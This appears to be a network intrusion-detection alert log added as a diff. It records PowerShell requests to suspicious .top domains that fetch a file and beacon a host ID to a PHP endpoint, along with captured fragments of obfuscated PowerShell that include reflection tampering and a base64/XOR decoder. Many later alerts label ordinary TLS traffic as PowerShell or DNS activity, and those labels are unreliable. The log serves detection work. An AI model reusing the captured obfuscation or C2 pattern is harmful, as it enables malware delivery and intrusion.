@@ -1,0 +1,1395 @@
+
+---- ALERT ----
+Time: 2025-12-02 16:23:20.094149
+Signature: powershell_command, malicious_domain, suspicious_user_agent
+Score: 10
+Payload:
+GET /f15.svg HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4046
+Host: pbvzje4.top
+Connection: Keep-Alive
+
+
+------------------
+
+---- ALERT ----
+Time: 2025-12-02 16:23:21.156266
+Signature: malicious_domain, php_c2
+Score: 8
+Payload:
+GET /b%20jzioh%20h.php?s=515 HTTP/1.1
+Host: bjlkchhaaigceke.top
+Connection: Keep-Alive
+
+
+------------------
+
+---- ALERT ----
+Time: 2025-12-02 16:23:21.429289
+Signature: powershell_command, base64_payload
+Score: 6
+Payload:
+senonenatanarataral).((-jOiN (@((10291-(12469-(5947-(9065-5379)))),(3217-3100),(2812-2714),(1403-(-4482+5770)),(-3086+(31981576/9988)),(-3286+(10730-(67861140/(10856-1598)))),(6974-(5981+888)),(388-(1293-1015)),(717601/(19012943/2729)))| ForEach-Object { [char]$_ })))(($_ * (462/231)), (5451-(6467-(3311554/(6893107/(-913+3032)))))))});$eredtionalaralorinerreatbearbetionbeedar = -join ((74290/1955)..(-7663+7714) | ForEach-Object {[char][int]((-50+79) + ($inesaralarerbeonatesbeatedre + $ontionbeisreeredesenonenatanarataral).(([ChaR[]]@((-6786+(15814-8945)),(3384-(2185+(2643-(5948971/(-753+4564))))),(8144-(68205942/8477)),(742325/(1070+5385)),(627792/(5119752/946)),(9725-9611),(1023330/9746),(578600/5260),(432188/(29288080/(-1326+8306)))) -join ''))(($_ * (-8631+8633)), (8813-(4257+(-5624+(11594-1416))))))});[Ref].((-JoIN (@((7+58),(5651-(50205984/9069)),(480355/4177),(799516/(-1919+(65501100/(-2235+(763+(30616980/3765)))))),(-8422+(59401353/6963)),(8115-(1627451/203)),(509112/4714),(231715/(11721715/(12866342/2102))))| ForEach-Object { [char]$_ }))).(-join (0..6 | ForEach-Object {[char]([int]('1491791941' + '62199190179').Substring($($_ * 3), 3) - 78)}) -join (0..6 | ForEach-Object {[char]([int]('1491791941' + '62199190179').Substring($($_ * 3), 3) - 78)}))($bereonesoraresoresised).(([CHAr[]]@((5432-(16962204/(-3272+(10443-4007)))),(1640-1539),(7158-(17147
+------------------
+
+---- ALERT ----
+Time: 2025-12-02 16:23:21.431277
+Signature: powershell_command, base64_payload
+Score: 6
+Payload:
+2000
+4-709))),(-5878+5948),(549570/(8300-(10144-(31129044/(13417-9019))))),(-6213+(15047-8733)),(983124/9103),(530000/5300)) -join ''))($eredtionalaralorinerreatbearbetionbeedar, ([ChaR[]]@((8070-(44555400/5575)),(241314/(4189298/(1636+291))),(636020/(15565144/2692)),(792800/(34645360/3496)),(850707/7271),(930608/9496),(708588/6561),(-8867+(3789+(7869-(9587-(8787-1886))))),(-7877+7976),(5981-5937),(77190/(-7482+8412)),(513300/(3827+598)),(740692/7636),(-7918+8034),(-7762+7867),(-1184+(5681-(101+4297)))) -join '')).(-join (0..7 | ForEach-Object {[char]([int]('120138153123' + '134145154138').Substring($($_ * 3), 3) - 37)}) -join (0..7 | ForEach-Object {[char]([int]('120138153123' + '134145154138').Substring($($_ * 3), 3) - 37)}))($null, $true)
+
+$2bd8jicthpv4qul = [System.Text.Encoding]::ascii
+function c0qp6hws432lydt7ur1jf5xa9nz  {param($al98bsfuyoqhi0n )
+  $394q5erilat702z = [System.Convert]::FromBase64String($al98bsfuyoqhi0n)
+  $ncpzry459bdxf6l= $2bd8jicthpv4qul.GetBytes("q5p96ms1hbr2")
+    $c3hv7kg8n1d05mj = $394q5erilat702z
+    $l8bt3fyh2cqp95m = $(for ($lrpd75wiqh2c8t1 = 0; $lrpd75wiqh2c8t1 -lt $c3hv7kg8n1d05mj.length; ) {
+        for ($lxb68ctgjhk3pny = 0; $lxb68ctgjhk3pny -lt $ncpzry459bdxf6l.length; $lxb68ctgjhk3pny++) {
+            $c3hv7kg8n1d05mj[$lrpd75wiqh2c8t1] -bxor $ncpzry459bdxf6l[$lxb68ctgjhk3pny]
+            $lrpd75wiqh2c8t1++
+------------------
+
+---- ALERT ----
+Time: 2025-12-02 16:23:22.924755
+Signature: powershell_command, malicious_domain, php_c2, suspicious_user_agent
+Score: 15
+Payload:
+GET /tx5lm7djyqhtr.php?id=DESKTOP-WIN10PC&key=74054124168&s=515 HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4046
+Host: bjlkchhaaigceke.top
+
+
+------------------
+
+---- ALERT ----
+Time: 2025-12-02 18:48:44.675473
+Signature: powershell_command, malicious_domain, suspicious_user_agent
+Score: 10
+Payload:
+GET /f15.svg HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4046
+Host: pbvzje4.top
+Connection: Keep-Alive
+
+
+------------------
+
+---- ALERT ----
+Time: 2025-12-02 18:48:44.803405
+Signature: powershell_command, malicious_domain, php_c2, suspicious_user_agent
+Score: 15
+Payload:
+GET /tx5lm7djyqhtr.php?id=DESKTOP-WIN10PC&key=74054124168&s=515 HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4046
+Host: bjlkchhaaigceke.top
+
+
+------------------
+
+---- ALERT ----
+Time: 2025-12-02 20:26:22.685142
+Signature: powershell_command, malicious_domain, suspicious_user_agent
+Score: 10
+Payload:
+GET /f15.svg HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4046
+Host: pbvzje4.top
+Connection: Keep-Alive
+
+
+------------------
+
+---- ALERT ----
+Time: 2025-12-02 20:26:22.756172
+Signature: powershell_command, malicious_domain, php_c2, suspicious_user_agent
+Score: 15
+Payload:
+GET /tx5lm7djyqhtr.php?id=DESKTOP-WIN10PC&key=74054124168&s=515 HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4046
+Host: bjlkchhaaigceke.top
+
+
+------------------
+
+---- ALERT ----
+Time: 2025-12-03 11:12:13.331449
+Signature: powershell_command, malicious_domain, suspicious_user_agent
+Score: 10
+Payload:
+GET /f15.svg HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4046
+Host: pbvzje4.top
+Connection: Keep-Alive
+
+
+------------------
+
+---- ALERT ----
+Time: 2025-12-03 11:12:14.397285
+Signature: malicious_domain, php_c2
+Score: 8
+Payload:
+GET /b%20jzioh%20h.php?s=515 HTTP/1.1
+Host: bjlkchhaaigceke.top
+Connection: Keep-Alive
+
+
+------------------
+
+---- ALERT ----
+Time: 2025-12-03 11:12:14.670555
+Signature: powershell_command, base64_payload
+Score: 6
+Payload:
+senonenatanarataral).((-jOiN (@((10291-(12469-(5947-(9065-5379)))),(3217-3100),(2812-2714),(1403-(-4482+5770)),(-3086+(31981576/9988)),(-3286+(10730-(67861140/(10856-1598)))),(6974-(5981+888)),(388-(1293-1015)),(717601/(19012943/2729)))| ForEach-Object { [char]$_ })))(($_ * (462/231)), (5451-(6467-(3311554/(6893107/(-913+3032)))))))});$eredtionalaralorinerreatbearbetionbeedar = -join ((74290/1955)..(-7663+7714) | ForEach-Object {[char][int]((-50+79) + ($inesaralarerbeonatesbeatedre + $ontionbeisreeredesenonenatanarataral).(([ChaR[]]@((-6786+(15814-8945)),(3384-(2185+(2643-(5948971/(-753+4564))))),(8144-(68205942/8477)),(742325/(1070+5385)),(627792/(5119752/946)),(9725-9611),(1023330/9746),(578600/5260),(432188/(29288080/(-1326+8306)))) -join ''))(($_ * (-8631+8633)), (8813-(4257+(-5624+(11594-1416))))))});[Ref].((-JoIN (@((7+58),(5651-(50205984/9069)),(480355/4177),(799516/(-1919+(65501100/(-2235+(763+(30616980/3765)))))),(-8422+(59401353/6963)),(8115-(1627451/203)),(509112/4714),(231715/(11721715/(12866342/2102))))| ForEach-Object { [char]$_ }))).(-join (0..6 | ForEach-Object {[char]([int]('1491791941' + '62199190179').Substring($($_ * 3), 3) - 78)}) -join (0..6 | ForEach-Object {[char]([int]('1491791941' + '62199190179').Substring($($_ * 3), 3) - 78)}))($bereonesoraresoresised).(([CHAr[]]@((5432-(16962204/(-3272+(10443-4007)))),(1640-1539),(7158-(17147
+------------------
+
+---- ALERT ----
+Time: 2025-12-03 11:12:14.671308
+Signature: powershell_command, base64_payload
+Score: 6
+Payload:
+2000
+4-709))),(-5878+5948),(549570/(8300-(10144-(31129044/(13417-9019))))),(-6213+(15047-8733)),(983124/9103),(530000/5300)) -join ''))($eredtionalaralorinerreatbearbetionbeedar, ([ChaR[]]@((8070-(44555400/5575)),(241314/(4189298/(1636+291))),(636020/(15565144/2692)),(792800/(34645360/3496)),(850707/7271),(930608/9496),(708588/6561),(-8867+(3789+(7869-(9587-(8787-1886))))),(-7877+7976),(5981-5937),(77190/(-7482+8412)),(513300/(3827+598)),(740692/7636),(-7918+8034),(-7762+7867),(-1184+(5681-(101+4297)))) -join '')).(-join (0..7 | ForEach-Object {[char]([int]('120138153123' + '134145154138').Substring($($_ * 3), 3) - 37)}) -join (0..7 | ForEach-Object {[char]([int]('120138153123' + '134145154138').Substring($($_ * 3), 3) - 37)}))($null, $true)
+
+$2bd8jicthpv4qul = [System.Text.Encoding]::ascii
+function c0qp6hws432lydt7ur1jf5xa9nz  {param($al98bsfuyoqhi0n )
+  $394q5erilat702z = [System.Convert]::FromBase64String($al98bsfuyoqhi0n)
+  $ncpzry459bdxf6l= $2bd8jicthpv4qul.GetBytes("q5p96ms1hbr2")
+    $c3hv7kg8n1d05mj = $394q5erilat702z
+    $l8bt3fyh2cqp95m = $(for ($lrpd75wiqh2c8t1 = 0; $lrpd75wiqh2c8t1 -lt $c3hv7kg8n1d05mj.length; ) {
+        for ($lxb68ctgjhk3pny = 0; $lxb68ctgjhk3pny -lt $ncpzry459bdxf6l.length; $lxb68ctgjhk3pny++) {
+            $c3hv7kg8n1d05mj[$lrpd75wiqh2c8t1] -bxor $ncpzry459bdxf6l[$lxb68ctgjhk3pny]
+            $lrpd75wiqh2c8t1++
+------------------
+
+---- ALERT ----
+Time: 2025-12-03 11:12:16.165378
+Signature: powershell_command, malicious_domain, php_c2, suspicious_user_agent
+Score: 15
+Payload:
+GET /tx5lm7djyqhtr.php?id=DESKTOP-WIN10PC&key=74054124168&s=515 HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4046
+Host: bjlkchhaaigceke.top
+
+
+------------------
+
+---- ALERT ----
+Time: 2025-12-03 11:27:48.575194
+Signature: powershell_command, malicious_domain, suspicious_user_agent
+Score: 10
+Payload:
+GET /f15.svg HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4046
+Host: pbvzje4.top
+Connection: Keep-Alive
+
+
+------------------
+
+---- ALERT ----
+Time: 2025-12-03 11:27:48.630947
+Signature: powershell_command, malicious_domain, php_c2, suspicious_user_agent
+Score: 15
+Payload:
+GET /tx5lm7djyqhtr.php?id=DESKTOP-WIN10PC&key=74054124168&s=515 HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4046
+Host: bjlkchhaaigceke.top
+
+
+------------------
+
+---- ALERT ----
+Time: 2025-12-03 11:32:37.544016
+Signature: powershell_command, malicious_domain, suspicious_user_agent
+Score: 10
+Payload:
+GET /f15.svg HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4046
+Host: pbvzje4.top
+Connection: Keep-Alive
+
+
+------------------
+
+---- ALERT ----
+Time: 2025-12-03 11:32:37.602510
+Signature: powershell_command, malicious_domain, php_c2, suspicious_user_agent
+Score: 15
+Payload:
+GET /tx5lm7djyqhtr.php?id=DESKTOP-WIN10PC&key=74054124168&s=515 HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.4046
+Host: bjlkchhaaigceke.top
+
+
+------------------
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:26.707959
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:33132
+  Protocol: TCP
+  Payload Size: 1408 bytes
+
+Payload Preview:
+[BASE64] azNqC0NH/mPg2NC9Qo2gdo9R9C9LIexW1GH+Fqb7baABfIxMaleVZvYoFKVWzqnBUNEq7cLs+YLDoJmjKoqOSlLvy+HFldwhcSpqKwj2wXkHzyiRA88AdahyTc+Ru40qpxkTQg==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:26.816986
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:33132
+  Protocol: TCP
+  Payload Size: 1408 bytes
+
+Payload Preview:
+[BASE64] 4FHdYdKJlWteCKcqWMmql0CKmdXuSQ5aKRI7x4AhIHu+mw0kwKxmIX2XwVOuBihbAHBQzg1bJ8HRgi8AA/8IPYiExxafQqDExZouRL4PDDPVQQ8UqSYi2y2tYJMJ2KXbnprH4A==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:27.709349
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:33132
+  Protocol: TCP
+  Payload Size: 1408 bytes
+
+Payload Preview:
+[BASE64] 5c3S9ZehkflNxd91wBqdbY4neSWU07y955UXBmgVwdnSKCK1kmi2Sr9MhQPPiJn4X2ewxTyFOUQqC8L33O1MElJvuPrzIeXzwZXyPNZfRaMcMoSD5T3hGjPB5u8PRj7s/YCNFw==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:29.091735
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:33132
+  Protocol: TCP
+  Payload Size: 1408 bytes
+
+Payload Preview:
+[BASE64] 0gwyl6owGjvj0l1BKTk0cm+U/sDqBSmHeEtPGZFa/DTxSpTs9v/r3Sn4l5SNANCWKvufAawrKXrAna8PG6cm98/AjltGGcelKQqiexC7W7hkEu7t82IssMVxHBux1AqdJkIVKA==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:30.681250
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:33132
+  Protocol: TCP
+  Payload Size: 1408 bytes
+
+Payload Preview:
+[BASE64] CsrMOE0uo9L5Mt2gmK8MSf1Tcztz1y9uSFnjkqiZKXg8yP22Xv3VXVCf2jo6gN/JArGOiij0GFXGPoGKX1xiEXPLrsa6sdbxi53jM87vrPDVcwZGQw3PCc5weHa7FT3GuoF1/w==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:31.181426
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:33132
+  Protocol: TCP
+  Payload Size: 1408 bytes
+
+Payload Preview:
+[BASE64] Unvzk9m+9e7ivXlRdw+n/nUK58AGU8ccylQ2+MejA1YeuWv0T8DnrB/0he+zBKkWmMgiexoVSWfrgl94vW1OQKR7VENK1Z6BY0JURO9k/mSLArHw+cTYlYyynnHTkPpe7Ta/Tg==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:31.927822
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:33132
+  Protocol: TCP
+  Payload Size: 1408 bytes
+
+Payload Preview:
+[BASE64] vMCr8ypSQ+4JIHnYhRvacwyCss+h7Pc9oAjiEXIFH2VTheqtW9S7K32yxTVCjxxIYnBKn6H4cvJNocMEmnxAgSDFXGTPKpqQfbUTuAobjEe++GYlz0SPyEOg8PE8Io73nW2awA==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:31.940436
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:33132
+  Protocol: TCP
+  Payload Size: 1408 bytes
+
+Payload Preview:
+[BASE64] zC3drmQwZkFPVQA/OYDTDBpw5Vyl3LxQ8uRR/ZbxbJfxSvwb6ebdDrP7hBmvaYvY7obIObPbmGQ271fq7L1ZkKYRAiYYvDcEcL82Govjw3bnZezDzVql+sL9vziEXBBFU//shg==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:32.010554
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:33132
+  Protocol: TCP
+  Payload Size: 1408 bytes
+
+Payload Preview:
+[BASE64] d6WrH+7NhkakLVhxJa6JC+4IOgBjfHrhIHgiS6o4prVtPK09SvYdfm2ky/I0OrpNb3sEv0wvxgX0F+mhfX2BGa/yIEXRDzZ8rYlv3srQk85TBS3Mir3U6XD3jg6PXOVyL27g8w==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:32.011025
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:33132
+  Protocol: TCP
+  Payload Size: 1250 bytes
+
+Payload Preview:
+[BASE64] qyUQM+eDnSNxjuiBijLduaaMoVUKEoJXLBciRb1LA5uD7uG2agM/k5MymXXnZoCh+yx2LIeXpc1dU0DowtyU2cM7kgaqnsMvA49eUC7NJ6/JLPKtF8P5IirV6vnN71ek/WpikQ==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:32.162311
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:33132
+  Protocol: TCP
+  Payload Size: 1408 bytes
+
+Payload Preview:
+[BASE64] xjAKm4bHIExa+PKTYRxiLqjRpU6jWNl3LbZ1euWA0a0XGwTE4U3ScaNerf4d9ntU7iK0Fj3ta0i9n3d/E766eyvbPrCleaUeBH8UFnIlci0W/ZOlYPaPvSVDcGX+3JG7Efxzug==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:33.830527
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:33132
+  Protocol: TCP
+  Payload Size: 1408 bytes
+
+Payload Preview:
+[BASE64] 01pEc9xVqRk5UF7k4oqcmwyjEdXzYQ4h/jlAruv+JL1qxiExRtVJMI4vDs3PfpCIj97WUc36n2v8hU93D9KGf1xdQz7s0e226PgTvaWVq8j6RaUwDCUUwWApQyoc0L8Xb2SbEg==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:35.087129
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:33132
+  Protocol: TCP
+  Payload Size: 1408 bytes
+
+Payload Preview:
+[BASE64] C719CNWpX15gDhECsmPGSaekbKNfR4ni7bl8WjbcbbaoItnGwiirhMlK6HNmKQQU+6/Dsp1Ax5UFNoZ3HO7W+3Vm47QeKhXsKltMm1frKaieXB5mAIah0whhOHj4oHyihoIZKg==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:35.497721
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:49776
+  Protocol: TCP
+  Payload Size: 1408 bytes
+
+Payload Preview:
+[BASE64] FwMDBXsAAAAAAAAAWX47+v7cAOC0C2vMAevyUIljVk3stttlvuWVIexn4yXQ05s1r9Twgm3qgkpkc2piwqEHAfw+1H1OzZxFZ0ceA1VFZqRZWohIXSXp4ZpXkVV6+kXqY31EIg==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:35.704741
+Signature(s): base64_payload, large_dns_query
+Threat Score: 8
+
+Packet Info:
+  Source: 34.160.90.233:443
+  Destination: 10.18.156.186:51126
+  Protocol: TCP
+  Payload Size: 69 bytes
+
+Payload Preview:
+[BASE64] FwMDAEAAAAAAAAAAAczLHmIQj3iw3n6CqcT1esMF22GnmxIGaEPeukf0tVQn66utAi9jZSTXgIwOdKqH0HIsu1gcejm4...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:35.935261
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:33132
+  Protocol: TCP
+  Payload Size: 1408 bytes
+
+Payload Preview:
+[BASE64] jSIxqdDnD7cbWCRprOxn6PUqVnAPNTs/3qUTcA8AaUL+fLaeGagu8y5WipjDjTMMfiv6wZTB19nSXVRCRBrTHRrGHtuyaS7oU29TGRWLAwabpCNKTIeXzoHr/kSRwAf1ozol2A==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:36.343286
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 35.190.72.216:443
+  Destination: 10.18.156.186:49480
+  Protocol: TCP
+  Payload Size: 185 bytes
+
+Payload Preview:
+[BASE64] FwMDALRg8AKJHMi0EPNPsT1zcb/l23iExTNHPBVVsTCGCwB+xwqjCNt59gGe7coWDcvyPzfExK3PVjR1mDMTKk9ltq+SHlWnfdZv2lRTfgyfaNKKtddHHF6mo20UI3yD/ABcqw==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:37.052360
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:33132
+  Protocol: TCP
+  Payload Size: 1408 bytes
+
+Payload Preview:
+[BASE64] S2wwv07IARW5hOEZzKRG9BiEX5ELfRAK1j7AUYbWw7d+4cSJZnzQElBBQ+Tpd85IbMaqx6Wg98yJoxgvMQzoB0knQbOHwmTar7LEmwVD1Wk4sZHAulGeID1zndW2shwpYcSAgw==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:37.470778
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:33132
+  Protocol: TCP
+  Payload Size: 1408 bytes
+
+Payload Preview:
+[BASE64] f8mPPQ5ikeaxFMYbLhnLDT6Qa59tJGjqVB1+IwvMCfW8LFpsePa967o+PYejrwc25ZtCZQGiieX4XIoBlJXbW5rFCTgyXq1lNGp/sMfYTP/U2tj+jWXb3jVDHGg0uBEZHiVKgQ==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:37.484385
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:33132
+  Protocol: TCP
+  Payload Size: 1408 bytes
+
+Payload Preview:
+[BASE64] pQChcGsi2NIhWvHG16HGzeHBItV/D/+Fd9zCbwVaO3nodIlFqddiiR9Zu2chfoK82WKHp8f84LGU281XCaGlBDe5ttriExDxrTM146dDaZVsgB2zG15WeMRMBaBInR9F23qjGw==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:37.943683
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:33132
+  Protocol: TCP
+  Payload Size: 1408 bytes
+
+Payload Preview:
+[BASE64] a+7l6DUCjtrjYfD8isU3M7BV5XQ5f+w5eOlZkXLCR1o7ICE4C5BGfUE60Ow9l4YB9R8fraaI/p4wHIse9KmIexFS4g9CPJpgoBEcc9Pmi4+37nNdQN+Wr4IkwmGMsch/n36SLA==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:39.627927
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:33132
+  Protocol: TCP
+  Payload Size: 1408 bytes
+
+Payload Preview:
+[BASE64] /pb5fgFqLhsV07mmEQmOLQVjC/U6TOvl72vpI/6D72cUIQhRbjcc4BieXrowiMsrfyWcj6cSin45l1v+E7M0eTUSUvGpCSvu2mVjQfziGwxHRtX2+FnY+YNpntrCsBE806jxsA==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:40.808416
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:33132
+  Protocol: TCP
+  Payload Size: 1408 bytes
+
+Payload Preview:
+[BASE64] Trn9q5YE6Ec4jEI73ujirMQK6SJqBA7U+xunqsGyYx19pGGxyWGyIcRome1n2jP3eiEXFp6w/CPpY95m4W/5AM26ZOLqefvSsVFAwySi2ZBkXneXKZy3DFzY1a6E6tWMHX3W7Q==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:40.810907
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:33132
+  Protocol: TCP
+  Payload Size: 1408 bytes
+
+Payload Preview:
+[BASE64] ob0i4kDL1iAPK4sBkWp1C55Kof7K9zFECfZVgC1Ape5FVqA5IEk5wqWO1Ech0OGGWS8fnlb2BCAOnHjPZotC3nCTJglXD8g8w4OU7y5d1S94NBmWSuh+0sxs5M7lDiEx2/4u2A==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:17:41.068810
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 199.232.81.91:443
+  Destination: 10.18.156.186:33132
+  Protocol: TCP
+  Payload Size: 1408 bytes
+
+Payload Preview:
+[BASE64] Evgf7Vz4Aqtk1I81MiEX5QW/utrW+6D43lfcz8NQphFGeKh2ywuoaLIvVMpJDcOR0N98Q5PCi4gQ0t7CASlzVfBPcEVgz+A36V4x1bNIjFm/LA9aEYg/EMjpYelzySiWpCYLbw==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:18:04.983385
+Signature(s): powershell_command, base64_payload
+Threat Score: 6
+
+Packet Info:
+  Source: 10.18.156.186:59404
+  Destination: 34.120.208.123:443
+  Protocol: TCP
+  Payload Size: 116 bytes
+
+Payload Preview:
+[BASE64] FwMDAG8AAAAAAAAAAZz/2ezmMIexQo1OdBFcrHZdtpzAAeQ9wEPfPzoHxEC9MCt1pCS+DnAFAIlvii78tSqV1ChqY0aYsXyhXbfib7aHRKjpl8js+M69kic5EOIJs2+ELWeVrQ==...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:18:06.882532
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 10.18.156.186:46540
+  Destination: 34.149.117.202:443
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACItRob1DqFk1ynVjzzaA9JyvBEa5MqytXQBKXGtgkTUO845...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:18:06.949550
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 34.149.117.202:443
+  Destination: 10.18.156.186:46540
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACLQyzW1Xcjg0nEiRVkv091dxXiDeboPB53YAfrb8izSPD8O...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:18:07.901085
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 10.18.156.186:49788
+  Destination: 199.232.81.91:443
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
+[BASE64] FwMDACJgMPORTxeuo89nwwb9EjTBCcsV3aYYjATxZgPgpYEOqPOe...
+==================================================
+
+
+==================================================
+🚨 CRITICAL ALERT
+==================================================
+Time: 2025-12-26 23:18:07.964288
+Signature(s): large_dns_query
+Threat Score: 6
+
+Packet Info:
+  Source: 34.107.243.93:443
+  Destination: 10.18.156.186:51336
+  Protocol: TCP
+  Payload Size: 39 bytes
+
+Payload Preview:
